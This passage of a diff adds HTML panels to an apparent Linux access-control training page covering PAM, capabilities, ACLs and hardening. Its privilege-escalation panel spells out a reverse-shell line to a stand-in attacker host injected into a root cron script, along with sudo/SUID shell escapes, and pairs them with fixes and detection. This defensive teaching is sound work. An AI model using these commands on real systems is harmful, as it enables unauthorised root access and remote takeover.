+    </div>
+  </div>
+</div>
+
+<!-- ═══ PANEL 04 — PAM ═══ -->
+<div class="panel">
+  <div class="ph"><span style="font-size:14px">🔑</span><span class="pt">PAM — Pluggable Authentication Modules</span><span class="pn">PANEL 04</span></div>
+  <div class="pb">
+    <div class="g2" style="margin-bottom:14px">
+      <div class="cb cbl">
+        <div class="cbt">What Is PAM?</div>
+        <div class="ct">
+          PAM decouples <span class="hl">authentication</span> from applications. Instead of each application implementing its own login logic, they call PAM. PAM consults a chain of modules — each can verify identity, set limits, or enforce policy.<br><br>
+          Any service with a file in <code>/etc/pam.d/</code> uses PAM: <span class="hc">login</span>, <span class="hc">sshd</span>, <span class="hc">sudo</span>, <span class="hc">su</span>, <span class="hc">gdm</span>, <span class="hc">cron</span>. Misconfiguring PAM can lock everyone out or silently bypass authentication.
+        </div>
+      </div>
+      <div class="cb cbg">
+        <div class="cbt">PAM Module Types</div>
+        <div style="font-size:12px;color:var(--t2);line-height:1.9">
+          <span class="hl">auth</span> — verify identity (password, TOTP, SSH key)<br>
+          <span class="hc">account</span> — check account validity (expired? locked? time restriction?)<br>
+          <span class="hy">password</span> — handle password updates (complexity, history)<br>
+          <span class="ho">session</span> — setup/teardown (mount homedir, set ulimits, log session)
+        </div>
+      </div>
+    </div>
+
+    <!-- PAM control flags -->
+    <div style="font-family:var(--sans);font-size:11px;letter-spacing:2px;color:var(--t3);text-transform:uppercase;margin-bottom:8px">PAM Control Flags — How Failures Are Handled</div>
+    <table class="tbl" style="margin-bottom:14px">
+      <thead><tr><th>Control Flag</th><th>Behaviour on Success</th><th>Behaviour on Failure</th></tr></thead>
+      <tbody>
+        <tr><td>required</td><td style="color:var(--t2)">Continue stack</td><td style="color:var(--r)">Continue stack but final result = FAIL</td></tr>
+        <tr><td>requisite</td><td style="color:var(--t2)">Continue stack</td><td style="color:var(--r)">Immediately fail — stop processing</td></tr>
+        <tr><td>sufficient</td><td style="color:var(--g)">Immediately succeed (if no prior required failure)</td><td style="color:var(--t2)">Ignore — continue stack</td></tr>
+        <tr><td>optional</td><td style="color:var(--t2)">Continue — doesn't affect final result</td><td style="color:var(--t2)">Continue — doesn't affect final result</td></tr>
+      </tbody>
+    </table>
+
+    <!-- PAM stack for sshd -->
+    <div style="font-family:var(--sans);font-size:11px;letter-spacing:2px;color:var(--t3);text-transform:uppercase;margin-bottom:8px">/etc/pam.d/sshd — Annotated SSH PAM Stack</div>
+    <div style="background:var(--bg);border:1px solid var(--b2);padding:14px;margin-bottom:14px">
+      <div style="display:flex;gap:10px;font-family:var(--sans);font-size:10px;font-weight:600;letter-spacing:1px;text-transform:uppercase;color:var(--t3);margin-bottom:8px;padding-bottom:6px;border-bottom:1px solid var(--b2)">
+        <span style="width:80px">TYPE</span><span style="width:90px">CONTROL</span><span style="width:220px">MODULE</span><span>PURPOSE</span>
+      </div>
+      <div class="pam-module">
+        <div class="pam-type" style="color:var(--g)">auth</div>
+        <div class="pam-ctrl" style="color:var(--y)">required</div>
+        <div class="pam-mod">pam_env.so</div>
+        <div class="pam-desc">Load environment variables from /etc/environment</div>
+      </div>
+      <div class="pam-module">
+        <div class="pam-type" style="color:var(--g)">auth</div>
+        <div class="pam-ctrl" style="color:var(--y)">required</div>
+        <div class="pam-mod">pam_faildelay.so delay=2000000</div>
+        <div class="pam-desc">Add 2s delay on failure (brute-force mitigation)</div>
+      </div>
+      <div class="pam-module">
+        <div class="pam-type" style="color:var(--g)">auth</div>
+        <div class="pam-ctrl" style="color:var(--r)">requisite</div>
+        <div class="pam-mod">pam_nologin.so</div>
+        <div class="pam-desc">Deny login if /etc/nologin exists (maintenance mode)</div>
+      </div>
+      <div class="pam-module">
+        <div class="pam-type" style="color:var(--g)">auth</div>
+        <div class="pam-ctrl" style="color:var(--g)">sufficient</div>
+        <div class="pam-mod" style="color:var(--c)">pam_unix.so nullok</div>
+        <div class="pam-desc">Verify password against /etc/shadow — if OK, auth succeeds</div>
+      </div>
+      <div class="pam-module">
+        <div class="pam-type" style="color:var(--g)">auth</div>
+        <div class="pam-ctrl" style="color:var(--y)">required</div>
+        <div class="pam-mod">pam_google_authenticator.so</div>
+        <div class="pam-desc">TOTP 2FA — require OTP after password (MFA stack)</div>
+      </div>
+      <div class="pam-module">
+        <div class="pam-type" style="color:var(--c)">account</div>
+        <div class="pam-ctrl" style="color:var(--y)">required</div>
+        <div class="pam-mod" style="color:var(--c)">pam_unix.so</div>
+        <div class="pam-desc">Check account not expired, not locked</div>
+      </div>
+      <div class="pam-module">
+        <div class="pam-type" style="color:var(--c)">account</div>
+        <div class="pam-ctrl" style="color:var(--y)">required</div>
+        <div class="pam-mod">pam_access.so</div>
+        <div class="pam-desc">Check /etc/security/access.conf (IP/group restrictions)</div>
+      </div>
+      <div class="pam-module">
+        <div class="pam-type" style="color:var(--o)">session</div>
+        <div class="pam-ctrl" style="color:var(--y)">required</div>
+        <div class="pam-mod">pam_limits.so</div>
+        <div class="pam-desc">Apply /etc/security/limits.conf (ulimits per user)</div>
+      </div>
+      <div class="pam-module" style="border:none">
+        <div class="pam-type" style="color:var(--o)">session</div>
+        <div class="pam-ctrl" style="color:var(--t3)">optional</div>
+        <div class="pam-mod">pam_lastlog.so</div>
+        <div class="pam-desc">Display last login info after successful auth</div>
+      </div>
+    </div>
+
+    <div class="term">
+      <div class="tbar"><div class="td" style="background:#ff5f57"></div><div class="td" style="background:#febc2e"></div><div class="td" style="background:#28c840"></div>
+        <span style="margin-left:8px;font-size:11px;color:var(--t3);font-family:var(--sans)">PAM hardening & audit</span></div>
+      <div class="tb">
+        <span class="sec">──── PASSWORD COMPLEXITY (pam_pwquality) ────</span>
+        <span class="out"># /etc/security/pwquality.conf</span>
+        <span class="ocn">minlen = 14</span>
+        <span class="ocn">minclass = 4        # must use all 4 char classes</span>
+        <span class="ocn">maxrepeat = 3       # no more than 3 repeated chars</span>
+        <span class="ocn">dcredit = -1        # at least 1 digit</span>
+        <span class="ocn">ucredit = -1        # at least 1 uppercase</span>
+        <span class="ocn">lcredit = -1        # at least 1 lowercase</span>
+        <span class="ocn">ocredit = -1        # at least 1 special char</span>
+        <span class="sec">──── ACCOUNT LOCKOUT (pam_faillock) ────</span>
+        <span class="out"># /etc/security/faillock.conf</span>
+        <span class="oyn">deny = 5            # lock after 5 failed attempts</span>
+        <span class="oyn">unlock_time = 900   # unlock after 15 minutes</span>
+        <span class="oyn">fail_interval = 300 # count failures within 5 min window</span>
+        <span class="sec">──── CHECK FAILED LOGIN ATTEMPTS ────</span>
+        <span><span class="pr">root@lab:~# </span><span style="color:#fff">faillock --user alice</span></span>
+        <span class="out">alice:</span>
+        <span class="ored">When                Type  Source        Valid</span>
+        <span class="ored">2026-05-03 02:11:01 RHOST 10.10.10.5     V   ← brute force from external IP</span>
+        <span class="ored">2026-05-03 02:11:03 RHOST 10.10.10.5     V</span>
+        <span class="sec">──── RESOURCE LIMITS (/etc/security/limits.conf) ────</span>
+        <span class="ocn">alice  soft  nproc  100     # max 100 processes</span>
+        <span class="ocn">alice  hard  nproc  200</span>
+        <span class="ocn">@developers soft nofile 65536  # file descriptor limit for group</span>
+        <span class="ocn">*  hard  core  0            # disable core dumps globally</span>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ═══ PANEL 05 — CAPABILITIES ═══ -->
+<div class="panel">
+  <div class="ph"><span style="font-size:14px">🎯</span><span class="pt">Linux Capabilities — Fine-Grained Privilege Model</span><span class="pn">PANEL 05</span></div>
+  <div class="pb">
+    <div class="info"><span style="color:var(--c);flex-shrink:0">ℹ</span><span>Traditionally: root = all privileges or nothing. <strong style="color:var(--c)">Capabilities</strong> split root's power into ~40 independent tokens. A process can have specific capabilities without being fully root. Example: nginx can bind port 80 with only <code>CAP_NET_BIND_SERVICE</code> — no other root powers needed.</span></div>
+
+    <div class="g4" style="margin-bottom:14px">
+      <div class="cap-card">
+        <div class="cap-name">CAP_NET_BIND_SERVICE</div>
+        <div class="cap-desc">Bind to ports below 1024 (privileged ports). Webservers, SSH daemon.</div>
+        <div class="cap-risk tag tg">LOW RISK</div>
+      </div>
+      <div class="cap-card">
+        <div class="cap-name">CAP_NET_RAW</div>
+        <div class="cap-desc">Create raw sockets. Needed by ping, tcpdump, nmap.</div>
+        <div class="cap-risk tag ty">MEDIUM RISK</div>
+      </div>
+      <div class="cap-card">
+        <div class="cap-name">CAP_SYS_PTRACE</div>
+        <div class="cap-desc">Trace/debug any process (ptrace syscall). Debuggers, strace.</div>
+        <div class="cap-risk tag tr2">HIGH RISK</div>
+      </div>
+      <div class="cap-card">
+        <div class="cap-name">CAP_SYS_ADMIN</div>
+        <div class="cap-desc">Massive: mount/unmount, chroot, sethostname, many more. Effectively root.</div>
+        <div class="cap-risk tag tr2">CRITICAL</div>
+      </div>
+      <div class="cap-card">
+        <div class="cap-name">CAP_CHOWN</div>
+        <div class="cap-desc">Change file UID/GID arbitrarily. Can chown /etc/shadow to self.</div>
+        <div class="cap-risk tag tr2">HIGH RISK</div>
+      </div>
+      <div class="cap-card">
+        <div class="cap-name">CAP_DAC_OVERRIDE</div>
+        <div class="cap-desc">Bypass all DAC file permission checks. Read any file regardless of rwx.</div>
+        <div class="cap-risk tag tr2">CRITICAL</div>
+      </div>
+      <div class="cap-card">
+        <div class="cap-name">CAP_SETUID</div>
+        <div class="cap-desc">Set arbitrary UIDs. Process can become root (UID 0) at will.</div>
+        <div class="cap-risk tag tr2">CRITICAL</div>
+      </div>
+      <div class="cap-card">
+        <div class="cap-name">CAP_SYS_MODULE</div>
+        <div class="cap-desc">Load/unload kernel modules. One malicious module = full kernel compromise.</div>
+        <div class="cap-risk tag tr2">CRITICAL</div>
+      </div>
+    </div>
+
+    <div class="term">
+      <div class="tbar"><div class="td" style="background:#ff5f57"></div><div class="td" style="background:#febc2e"></div><div class="td" style="background:#28c840"></div>
+        <span style="margin-left:8px;font-size:11px;color:var(--t3);font-family:var(--sans)">Capabilities management & audit</span></div>
+      <div class="tb">
+        <span class="sec">──── GRANT CAPABILITY TO BINARY (instead of SUID) ────</span>
+        <span><span class="pr">root@lab:~# </span><span style="color:#fff">setcap cap_net_bind_service=+eip /usr/bin/node</span></span>
+        <span class="ocn"># Node.js can now bind port 80 without running as root or SUID</span>
+        <span><span class="pr">root@lab:~# </span><span style="color:#fff">getcap /usr/bin/node</span></span>
+        <span class="ogn">/usr/bin/node cap_net_bind_service=eip</span>
+        <span class="sec">──── AUDIT ALL BINARIES WITH CAPABILITIES ────</span>
+        <span><span class="pr">root@lab:~# </span><span style="color:#fff">getcap -r / 2>/dev/null</span></span>
+        <span class="out">/usr/bin/ping         cap_net_raw=ep</span>
+        <span class="out">/usr/bin/dumpcap      cap_net_admin,cap_net_raw=eip</span>
+        <span class="ored">/usr/bin/python3.12   cap_setuid=ep  ← dangerous! python can setuid to 0</span>
+        <span class="sec">──── PROCESS CAPABILITIES ────</span>
+        <span><span class="pr">root@lab:~# </span><span style="color:#fff">cat /proc/1234/status | grep Cap</span></span>
+        <span class="out">CapInh: 0000000000000000   # inherited caps</span>
+        <span class="out">CapPrm: 0000000000003000   # permitted caps</span>
+        <span class="oyn">CapEff: 0000000000003000   # effective (active) caps</span>
+        <span class="out">CapBnd: 000001ffffffffff   # bounding set (ceiling)</span>
+        <span><span class="pr">root@lab:~# </span><span style="color:#fff">capsh --decode=0000000000003000</span></span>
+        <span class="ocn">0x0000000000003000=cap_net_bind_service,cap_net_admin</span>
+        <span class="sec">──── DROP ALL CAPS IN CONTAINER (secure config) ────</span>
+        <span class="out"># docker-compose.yml</span>
+        <span class="ocn">cap_drop: [ALL]</span>
+        <span class="ocn">cap_add: [NET_BIND_SERVICE]  # only what's needed</span>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ═══ PANEL 06 — PRIVILEGE ESCALATION ═══ -->
+<div class="panel">
+  <div class="ph"><span style="font-size:14px">🔺</span><span class="pt">Privilege Escalation — Attack Vectors &amp; Detection</span><span class="pn">PANEL 06</span></div>
+  <div class="pb">
+    <div class="danger"><span style="color:var(--r);flex-shrink:0">⛔</span><span><strong style="color:var(--r)">Red Team:</strong> Privilege escalation = going from low-privilege user → root. Linux misconfigurations make this the most common post-exploitation technique. Every one of these vectors has been used in real-world breaches.</span></div>
+
+    <!-- PrivEsc chains -->
+    <div style="font-family:var(--sans);font-size:11px;letter-spacing:2px;color:var(--t3);text-transform:uppercase;margin-bottom:10px">Common Privilege Escalation Chains</div>
+
+    <!-- SUID -->
+    <div style="background:var(--bg3);border:1px solid rgba(255,59,59,.3);padding:12px 14px;margin-bottom:8px">
+      <div style="font-family:var(--sans);font-weight:700;font-size:12px;color:var(--r);margin-bottom:6px">① SUID Binary Abuse</div>
+      <div class="pe-chain">
+        <div class="pe-box" style="border-color:rgba(0,212,255,.3)"><div class="pe-title" style="color:var(--c)">Regular user</div><div class="pe-sub">uid=1001(alice)</div></div>
+        <div class="pe-arrow">→</div>
+        <div class="pe-box" style="border-color:rgba(255,215,0,.3)"><div class="pe-title" style="color:var(--y)">Find SUID binary</div><div class="pe-sub">find / -perm -4000</div></div>
+        <div class="pe-arrow">→</div>
+        <div class="pe-box" style="border-color:rgba(255,140,0,.3)"><div class="pe-title" style="color:var(--o)">Exploit binary</div><div class="pe-sub">GTFOBins technique</div></div>
+        <div class="pe-arrow">→</div>
+        <div class="pe-box" style="border-color:rgba(255,59,59,.4)"><div class="pe-title" style="color:var(--r)">Root shell</div><div class="pe-sub">uid=0(root)</div></div>
+      </div>
+      <div style="font-size:11px;color:var(--t3);margin-top:8px">Example: <span style="color:var(--c)">sudo find / -exec /bin/sh \;</span> or <span style="color:var(--c)">python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'</span> if python has cap_setuid</div>
+    </div>
+
+    <!-- sudo misconfiguration -->
+    <div style="background:var(--bg3);border:1px solid rgba(255,59,59,.3);padding:12px 14px;margin-bottom:8px">
+      <div style="font-family:var(--sans);font-weight:700;font-size:12px;color:var(--r);margin-bottom:6px">② sudo Misconfiguration</div>
+      <div style="font-size:12px;color:var(--t2);line-height:1.8">
+        <span style="color:var(--c)">alice ALL=(ALL) /usr/bin/vim</span> → <span style="color:var(--r)">sudo vim → :!/bin/bash → root shell</span><br>
+        <span style="color:var(--c)">alice ALL=(ALL) /usr/bin/less</span> → <span style="color:var(--r)">sudo less /etc/passwd → !/bin/bash → root shell</span><br>
+        <span style="color:var(--c)">alice ALL=(ALL) /usr/bin/awk</span> → <span style="color:var(--r)">sudo awk 'BEGIN {system("/bin/bash")}'</span><br>
+        <span style="color:var(--c)">alice ALL=(ALL) /usr/bin/python3 /opt/script.py</span> → <span style="color:var(--r)">if script.py is writable, replace contents with os.system('/bin/bash')</span>
+      </div>
+      <div style="font-size:11px;color:var(--t3);margin-top:6px">Reference: <span style="color:var(--y)">GTFOBins (gtfobins.github.io)</span> — comprehensive list of sudo/SUID escape techniques</div>
+    </div>
+
+    <!-- weak file permissions -->
+    <div style="background:var(--bg3);border:1px solid rgba(255,59,59,.3);padding:12px 14px;margin-bottom:8px">
+      <div style="font-family:var(--sans);font-weight:700;font-size:12px;color:var(--r);margin-bottom:6px">③ World-Writable Cron / Script Run as Root</div>
+      <div style="font-size:12px;color:var(--t2);line-height:1.8">
+        <span style="color:var(--o)">root's crontab runs:</span> <span style="color:var(--c)">/opt/scripts/backup.sh every minute</span><br>
+        <span style="color:var(--o)">backup.sh permissions:</span> <span style="color:var(--r)">-rwxrwxrwx (world-writable!)</span><br>
+        <span style="color:var(--y)">Attack:</span> <span style="color:var(--c)">echo 'bash -i >& /dev/tcp/attacker.com/4444 0>&1' >> /opt/scripts/backup.sh</span><br>
+        <span style="color:var(--y)">Result:</span> <span style="color:var(--r)">Within 60s, root reverse shell to attacker</span>
+      </div>
+    </div>
+
+    <!-- PATH hijacking -->
+    <div style="background:var(--bg3);border:1px solid rgba(255,59,59,.3);padding:12px 14px;margin-bottom:8px">
+      <div style="font-family:var(--sans);font-weight:700;font-size:12px;color:var(--r);margin-bottom:6px">④ PATH Hijacking</div>
+      <div style="font-size:12px;color:var(--t2);line-height:1.8">
+        SUID binary or sudo script calls <span style="color:var(--c)">system("ps")</span> without full path → attacker creates <span style="color:var(--c)">/tmp/ps</span> with malicious content → prepend /tmp to PATH → SUID binary runs attacker's ps as root.<br>
+        <span style="color:var(--y)">Fix: Always use absolute paths in scripts run as root. sudo sets secure_path.</span>
+      </div>
+    </div>
+
+    <!-- kernel exploit -->
+    <div style="background:var(--bg3);border:1px solid rgba(255,59,59,.3);padding:12px 14px;margin-bottom:14px">
+      <div style="font-family:var(--sans);font-weight:700;font-size:12px;color:var(--r);margin-bottom:6px">⑤ Kernel Exploits</div>
+      <div style="font-size:12px;color:var(--t2);line-height:1.8">
+        Dirty COW (CVE-2016-5195), DirtyCred (CVE-2022-2588), Netfilter (CVE-2022-25636) — race conditions or type confusion in kernel give any user root.<br>
+        Check: <span style="color:var(--c)">uname -r</span> → compare against known vulnerable kernels. <span style="color:var(--c)">linux-exploit-suggester.sh</span> automates this.
+      </div>
+    </div>
+
+    <div class="term">
+      <div class="tbar"><div class="td" style="background:#ff5f57"></div><div class="td" style="background:#febc2e"></div><div class="td" style="background:#28c840"></div>
+        <span style="margin-left:8px;font-size:11px;color:var(--t3);font-family:var(--sans)">PrivEsc enumeration commands (audit perspective)</span></div>
+      <div class="tb">
+        <span class="sec">──── AUTOMATED ENUMERATION ────</span>
+        <span><span class="pr">alice@lab:~$ </span><span style="color:#fff">sudo -l                        # what can I sudo?</span></span>
+        <span><span class="pr">alice@lab:~$ </span><span style="color:#fff">find / -perm -4000 2>/dev/null  # SUID binaries</span></span>
+        <span><span class="pr">alice@lab:~$ </span><span style="color:#fff">find / -perm -2000 2>/dev/null  # SGID binaries</span></span>
+        <span><span class="pr">alice@lab:~$ </span><span style="color:#fff">getcap -r / 2>/dev/null         # capabilities</span></span>
+        <span><span class="pr">alice@lab:~$ </span><span style="color:#fff">cat /etc/crontab; ls /etc/cron.*</span></span>
+        <span><span class="pr">alice@lab:~$ </span><span style="color:#fff">find / -writable -not -path '/proc/*' 2>/dev/null | head -20</span></span>
+        <span class="sec">──── PRIVILEGE ESCALATION VIA SUDO + LESS ────</span>
+        <span><span class="pr">alice@lab:~$ </span><span style="color:#fff">sudo less /etc/passwd</span></span>
+        <span class="out">... (less pager opens)</span>
+        <span class="oyn">!/bin/bash</span>
+        <span class="ored">root@lab:/home/alice#   ← root shell via less escape!</span>
+        <span class="sec">──── DETECTION: MONITOR PRIVESC ATTEMPTS ────</span>
+        <span><span class="pr">root@lab:~# </span><span style="color:#fff">auditctl -a always,exit -F arch=b64 -S execve -F euid=0 -k root_cmds</span></span>
+        <span><span class="pr">root@lab:~# </span><span style="color:#fff">ausearch -k root_cmds | grep -v "sshd\|cron\|systemd" | tail -10</span></span>
+        <span class="ored">type=EXECVE msg=audit: argc=2 a0="/bin/bash" a1="-i"  ← suspicious interactive bash as root</span>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ═══ PANEL 07 — ACLs DEEP DIVE ═══ -->
+<div class="panel">
+  <div class="ph"><span style="font-size:14px">📋</span><span class="pt">Access Control Lists (ACLs) — Beyond rwx</span><span class="pn">PANEL 07</span></div>
+  <div class="pb">
+    <div class="g2" style="margin-bottom:14px">
+      <div class="cb cbl">
+        <div class="cbt">Why ACLs?</div>
+        <div class="ct">
+          Standard Unix permissions support only <span class="hl">one owner + one group + others</span>. ACLs extend this to arbitrary users and groups per file.<br><br>
+          Scenario: /var/reports/ — root owns it, sysadmin group has rw, but you also need to give specific access to <span class="hc">contractor1</span> (r) and <span class="hc">finance_bot</span> (rw) without adding them to sysadmin group.<br><br>
+          The <span class="hl">effective mask</span> limits the maximum permissions any ACL entry can have. It's recalculated when group or ACL entries change.
+        </div>
+      </div>
+      <div class="cb cbp">
+        <div class="cbt">ACL Inheritance (Default ACLs)</div>
+        <div class="ct">
+          Set <span class="hp">default ACLs</span> on a directory — all <em>new files</em> created inside automatically inherit those ACLs.<br><br>
+          <code style="color:var(--c)">setfacl -d -m u:bob:rx /data/shared</code><br><br>
+          New files in /data/shared will grant bob read+execute automatically. Critical for shared directories where new files must always have consistent permissions.
+        </div>
+      </div>
+    </div>
+
+    <div class="term">
+      <div class="tbar"><div class="td" style="background:#ff5f57"></div><div class="td" style="background:#febc2e"></div><div class="td" style="background:#28c840"></div>
+        <span style="margin-left:8px;font-size:11px;color:var(--t3);font-family:var(--sans)">ACL operations — enterprise scenarios</span></div>
+      <div class="tb">
+        <span class="sec">──── SET ACLs ────</span>
+        <span><span class="pr">root@lab:~# </span><span style="color:#fff">setfacl -m u:alice:rwx,u:contractor1:r,g:finance:rw /var/reports/</span></span>
+        <span><span class="pr">root@lab:~# </span><span style="color:#fff">setfacl -d -m u:alice:rwx,g:finance:rw /var/reports/ # default ACL</span></span>
+        <span class="sec">──── READ ACLs ────</span>
+        <span><span class="pr">root@lab:~# </span><span style="color:#fff">getfacl /var/reports/</span></span>
+        <span class="out"># file: reports/</span>
+        <span class="out"># owner: root</span>
+        <span class="out"># group: sysadmin</span>
+        <span class="out">user::rwx</span>
+        <span class="ogn">user:alice:rwx          # alice has full access via ACL</span>
+        <span class="ocn">user:contractor1:r--    # contractor: read-only</span>
+        <span class="out">group::rw-</span>
+        <span class="ogn">group:finance:rw-       # finance group: read+write</span>
+        <span class="oyn">mask::rwx               # effective permission ceiling</span>
+        <span class="out">other::---</span>
+        <span class="out">default:user::rwx       # new files inherit these</span>
+        <span class="out">default:group:finance:rw-</span>
+        <span class="sec">──── REMOVE ACLs ────</span>
+        <span><span class="pr">root@lab:~# </span><span style="color:#fff">setfacl -x u:contractor1 /var/reports/  # remove one entry</span></span>
+        <span><span class="pr">root@lab:~# </span><span style="color:#fff">setfacl -b /var/reports/               # remove ALL ACLs</span></span>
+        <span class="sec">──── DETECT FILES WITH ACLs (+ in ls output) ────</span>
+        <span><span class="pr">root@lab:~# </span><span style="color:#fff">ls -la /var/reports/</span></span>
+        <span class="ocn">drwxrwx---+ 2 root sysadmin 4096 /var/reports/</span>
+        <span class="out">#        ↑ the '+' means ACLs are set — getfacl to see them</span>
+        <span class="sec">──── FIND ALL FILES WITH ACLS ON SYSTEM ────</span>
+        <span><span class="pr">root@lab:~# </span><span style="color:#fff">getfacl -R -s -p / 2>/dev/null | grep "^# file:" | head -10</span></span>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ═══ PANEL 08 — LINUX VS WINDOWS IAM ═══ -->
+<div class="panel">
+  <div class="ph"><span style="font-size:14px">⇄</span><span class="pt">Linux vs Windows — Identity &amp; Access Control Comparison</span><span class="pn">PANEL 08</span></div>
+  <div class="pb">
+    <table class="tbl">
+      <thead><tr><th>Dimension</th><th>🐧 Linux</th><th>🪟 Windows</th></tr></thead>
+      <tbody>
+        <tr><td>Identity token</td><td style="color:var(--t2)">UID / GID (integer) — resolved by NSS (/etc/passwd or LDAP)</td><td style="color:var(--t2)">SID (Security Identifier) — binary GUID-like, includes domain</td></tr>
+        <tr><td>Superuser</td><td style="color:var(--t2)">root (UID 0) — one account, all-powerful</td><td style="color:var(--t2)">SYSTEM / Administrator — SYSTEM is highest, runs services</td></tr>
+        <tr><td>Privilege elevation</td><td style="color:var(--g)">sudo — explicit, logged, per-command, policy in sudoers</td><td style="color:var(--t2)">UAC (User Account Control) — GUI prompt, token elevation</td></tr>
+        <tr><td>Permission model</td><td style="color:var(--t2)">DAC: rwx bits + POSIX ACLs + capabilities + LSM (SELinux/AppArmor)</td><td style="color:var(--t2)">NTFS ACLs (SID-based), integrity levels, privileges</td></tr>
+        <tr><td>Mandatory access control</td><td style="color:var(--g)">SELinux / AppArmor — process confinement, file labelling</td><td style="color:var(--y)">Windows Integrity Levels (Low/Medium/High/System) — weaker</td></tr>
+        <tr><td>Audit logging</td><td style="color:var(--g)">auditd, /var/log/auth.log, journald — flexible, text-based</td><td style="color:var(--t2)">Windows Event Log (.evtx) — Event IDs, PowerShell logging</td></tr>
+        <tr><td>Remote auth</td><td style="color:var(--g)">SSH keys (cert-based), Kerberos, LDAP, PAM modules</td><td style="color:var(--t2)">NTLM, Kerberos, RDP, WinRM, LDAP (AD)</td></tr>
+        <tr><td>Service accounts</td><td style="color:var(--g)">Dedicated UIDs, nologin shell, /etc/passwd entry</td><td style="color:var(--t2)">gMSA (group Managed Service Accounts), auto-rotating passwords</td></tr>
+        <tr><td>Password storage</td><td style="color:var(--g)">SHA-512 hash in /etc/shadow (root-only readable)</td><td style="color:var(--t2)">NT hash in SAM (protected) / domain: NTDS.dit</td></tr>
+        <tr><td>Pass-the-hash attack</td><td style="color:var(--g)">Not directly applicable (different hash use)</td><td style="color:var(--r)">Major risk — NTLM hashes can authenticate without cracking</td></tr>
+        <tr><td>Group policy</td><td style="color:var(--t2)">Manual config / Ansible / Chef / Puppet</td><td style="color:var(--g)">GPO (Group Policy Objects) — centralized, hierarchical</td></tr>
+        <tr><td>Multi-factor auth</td><td style="color:var(--g)">PAM module (Google Auth, Duo, YubiKey) — any service</td><td style="color:var(--t2)">Azure MFA, Windows Hello — mainly GUI and cloud-integrated</td></tr>
+        <tr><td>Privilege capabilities</td><td style="color:var(--g)">~40 granular capabilities — drop all, add only needed</td><td style="color:var(--y)">Windows Privileges (SeDebugPrivilege, SeTcbPrivilege) — less granular</td></tr>
+        <tr><td>Lockout policy</td><td style="color:var(--t2)">PAM faillock / faildelay — per-service configurable</td><td style="color:var(--t2)">Account Lockout Policy via GPO — domain-wide</td></tr>
+      </tbody>
+    </table>
+  </div>
+</div>
+
+<!-- ═══ PANEL 09 — SECURITY DEEP DIVE ═══ -->
+<div class="panel">
+  <div class="ph"><span style="font-size:14px">🔒</span><span class="pt">Security Hardening — IAM Checklist &amp; Defence-in-Depth</span><span class="pn">PANEL 09</span></div>
+  <div class="pb">
+    <div class="g2" style="margin-bottom:14px">
+      <div class="cb cbr">
+        <div class="cbt">Attack Surface — IAM Weaknesses</div>
+        <ul style="list-style:none;font-size:12px;color:var(--t2)">
+          <li style="padding:4px 0;border-bottom:1px solid var(--b2);display:flex;gap:8px"><span style="color:var(--r);flex-shrink:0">›</span>Second UID-0 account in /etc/passwd (backdoor)</li>
+          <li style="padding:4px 0;border-bottom:1px solid var(--b2);display:flex;gap:8px"><span style="color:var(--r);flex-shrink:0">›</span>NOPASSWD sudo rules — no authentication required</li>
+          <li style="padding:4px 0;border-bottom:1px solid var(--b2);display:flex;gap:8px"><span style="color:var(--r);flex-shrink:0">›</span>Users in docker/disk/shadow groups — implicit root</li>
+          <li style="padding:4px 0;border-bottom:1px solid var(--b2);display:flex;gap:8px"><span style="color:var(--r);flex-shrink:0">›</span>Weak PAM config — MD5 passwords, no lockout policy</li>
+          <li style="padding:4px 0;border-bottom:1px solid var(--b2);display:flex;gap:8px"><span style="color:var(--r);flex-shrink:0">›</span>Capabilities on interpreter binaries (python, perl, ruby)</li>
+          <li style="padding:4px 0;border-bottom:1px solid var(--b2);display:flex;gap:8px"><span style="color:var(--r);flex-shrink:0">›</span>sudo allowed for GTFOBins-listed binaries (vim, find, awk)</li>
+          <li style="padding:4px 0;display:flex;gap:8px"><span style="color:var(--r);flex-shrink:0">›</span>No MFA on SSH / sudo for privileged accounts</li>
+        </ul>
+      </div>
+      <div class="cb cbg">
+        <div class="cbt">Defence-in-Depth Controls</div>
+        <ul style="list-style:none;font-size:12px;color:var(--t2)">
+          <li style="padding:4px 0;border-bottom:1px solid var(--b2);display:flex;gap:8px"><span style="color:var(--g);flex-shrink:0">›</span>Disable root SSH login: <code>PermitRootLogin no</code> in sshd_config</li>
+          <li style="padding:4px 0;border-bottom:1px solid var(--b2);display:flex;gap:8px"><span style="color:var(--g);flex-shrink:0">›</span>Enforce SSH key-only auth: <code>PasswordAuthentication no</code></li>
+          <li style="padding:4px 0;border-bottom:1px solid var(--b2);display:flex;gap:8px"><span style="color:var(--g);flex-shrink:0">›</span>Audit sudoers weekly — remove NOPASSWD, restrict to specific commands</li>
+          <li style="padding:4px 0;border-bottom:1px solid var(--b2);display:flex;gap:8px"><span style="color:var(--g);flex-shrink:0">›</span>Enable PAM faillock + complexity via pam_pwquality</li>
+          <li style="padding:4px 0;border-bottom:1px solid var(--b2);display:flex;gap:8px"><span style="color:var(--g);flex-shrink:0">›</span>Deploy auditd rules watching /etc/passwd, /etc/sudoers, /etc/shadow</li>
+          <li style="padding:4px 0;border-bottom:1px solid var(--b2);display:flex;gap:8px"><span style="color:var(--g);flex-shrink:0">›</span>Use SELinux or AppArmor to confine even root-running services</li>
+          <li style="padding:4px 0;display:flex;gap:8px"><span style="color:var(--g);flex-shrink:0">›</span>Deploy MFA via PAM (Google Authenticator / YubiKey) for sudo + SSH</li>
+        </ul>
+      </div>
+    </div>
+
+    <div class="term">
+      <div class="tbar"><div class="td" style="background:#ff5f57"></div><div class="td" style="background:#febc2e"></div><div class="td" style="background:#28c840"></div>
+        <span style="margin-left:8px;font-size:11px;color:var(--t3);font-family:var(--sans)">Complete IAM hardening audit script</span></div>
+      <div class="tb">
+        <span class="sec">──── 1. UID-0 ACCOUNTS ────</span>
+        <span><span class="pr">root@lab:~# </span><span style="color:#fff">awk -F: '($3==0){print "[!] UID-0 account: "$1}' /etc/passwd</span></span>
+        <span class="ogn">[!] UID-0 account: root</span>
+        <span class="sec">──── 2. ACCOUNTS WITH NO PASSWORD ────</span>
+        <span><span class="pr">root@lab:~# </span><span style="color:#fff">awk -F: '($2=="" || $2=="!!" ){print "[!] No password: "$1}' /etc/shadow</span></span>
+        <span class="sec">──── 3. WEAK HASH ALGORITHMS ────</span>
